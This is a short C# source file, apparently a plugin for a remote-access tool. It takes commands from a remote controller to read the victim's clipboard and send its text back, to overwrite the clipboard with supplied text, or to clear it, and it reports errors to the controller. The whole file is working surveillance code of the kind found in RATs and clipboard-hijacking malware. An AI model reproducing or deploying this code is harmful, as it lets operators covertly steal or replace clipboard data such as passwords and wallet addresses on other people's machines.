using System;
using Leb128;
using Plugin.Helper;

namespace Plugin;

internal class Packet
{
	public static void Read(byte[] data)
	{
		try
		{
			object[] array = LEB128.Read(data);
			switch ((string)array[0])
			{
			case "Get":
				Client.Send(LEB128.Write(new object[3]
				{
					"Clipboard",
					"Get",
					Clipboard.GetText()
				}));
				break;
			case "Set":
				Clipboard.SetText((string)array[1]);
				break;
			case "Clear":
				Clipboard.SetText(string.Empty);
				break;
			}
		}
		catch (Exception ex)
		{
			Client.Send(LEB128.Write(new object[3] { "Clipboard", "Error", ex.Message }));
			Client.Error(ex.ToString());
		}
	}
}
